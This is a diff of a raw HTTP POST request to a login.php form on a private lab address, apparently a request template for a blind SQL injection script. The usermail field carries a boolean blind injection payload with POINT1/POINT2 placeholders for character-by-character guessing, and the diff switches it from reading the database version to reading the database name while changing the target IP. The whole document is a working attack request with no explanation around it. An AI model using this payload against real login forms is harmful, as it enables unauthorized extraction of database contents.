@@ -1,13 +1,13 @@
 POST /login.php HTTP/1.1
-Host: 192.168.171.132
+Host: 192.168.232.131
 User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en,el-GR;q=0.8,el;q=0.5,en-US;q=0.3
 Accept-Encoding: gzip, deflate
-Referer: http://192.168.171.132/account.php
+Referer: http://192.168.232.131/account.php
 Connection: close
 Upgrade-Insecure-Requests: 1
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 86
 
-usermail=asdf%40qwer.gz'+OR+(SUBSTRING((SELECT+@@version),1,POINT1)='POINT2')+--+-&password=asdf
+usermail=asdf%40qwer.gz'+OR+(SUBSTRING((SELECT+database()),1,POINT1)='POINT2')+--+-&password=asdf
